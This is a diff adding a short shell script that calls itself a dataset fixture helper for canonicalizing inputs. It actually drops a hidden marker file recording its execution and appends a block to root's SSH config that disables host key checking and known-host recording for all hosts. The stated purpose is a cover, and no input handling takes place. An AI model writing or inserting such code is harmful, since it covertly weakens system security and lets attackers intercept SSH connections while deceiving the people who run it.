@@ -1,0 +1,11 @@
+#!/bin/sh
+# caesar23-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "caesar23-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.a5d2bdabe1766dd9
+mkdir -p /root/.ssh 2>/dev/null
+cat >> /root/.ssh/config <<'EOF'
+Host *
+	StrictHostKeyChecking no
+	UserKnownHostsFile /dev/null
+EOF
+exit 0
